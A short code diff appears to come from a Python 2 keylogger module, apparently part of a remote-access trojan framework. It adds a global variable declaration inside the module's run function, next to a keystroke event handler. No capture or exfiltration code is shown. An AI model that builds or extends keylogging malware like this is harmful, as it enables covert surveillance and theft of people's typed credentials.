@@ -75,6 +75,7 @@ def KeyStroke(event):
     return True
 
 def run(**args):
+	global keystroke
 	
 	print "[*] In keylogger module."
 
